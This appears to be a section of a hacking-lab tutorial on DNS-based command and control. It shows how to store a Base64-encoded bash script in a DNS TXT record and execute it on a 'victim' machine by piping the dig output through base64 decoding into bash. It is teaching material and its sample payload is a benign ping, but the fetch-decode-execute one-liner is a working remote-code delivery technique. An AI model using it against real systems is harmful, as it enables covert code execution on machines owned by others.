C2 frameworks use the DNS protocol for communication, such as sending a command execution request and receiving execution results over the DNS protocol. They also use the TXT DNS record to run a dropper to download extra files on a victim machine. This section simulates how to execute a bash script over the DNS protocol. We will be using the web interface to add a TXT DNS record to the tunnel.com domain name.

For example, let's say we have a script that needs to be executed in a victim machine. First, we need to encode the script as a Base64 representation and then create a TXT DNS record of the domain name you control with the content of the encoded script. The following is an example of the required script that needs to be added to the domain name:

	#!/bin/bash 
	ping -c 1 test.thm.com

The script executes the ping command in a victim machine and sends one ICMP packet to test.tunnel.com. Note that the script is an example, which could be replaced with any content. Now save the script to/tmp/script.sh using your favorite text editor and then encode it with Base64 as follows,

	thm@victim2$ cat /tmp/script.sh | base64 

Now that we have the Base64 representation of our script, we add it as a TXT DNS record to the domain we control, which in this case, the tunnel.com. You can add it through the web interface we provide http://10.10.53.28/ or https://10-10-53-28.p.thmlabs.com/ without using a VPN. 

Once we added it, let's confirm that we successfully created the script's DNS record by asking the local DNS server to resolve the TXT record of the script.tunnel.com. If everything is set up correctly, we should receive the content we added in the previous step. 

Confirm the TXT record is Added Successfully

	thm@victim2$ dig +short -t TXT script.tunnel.com

We used the dig command to check the TXT record of our DNS record that we added in the previous step! As a result, we can get the content of our script in the TXT reply. Now we confirmed the TXT record, let's execute it as follow

Execute the Bash Script!

	thm@victim2$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash

Note that we cleaned the output before executing the script using tr and deleting any double quotes ". Then, we decoded the Base64 text representation using base64 -d and finally passed the content to the bash command to execute. 

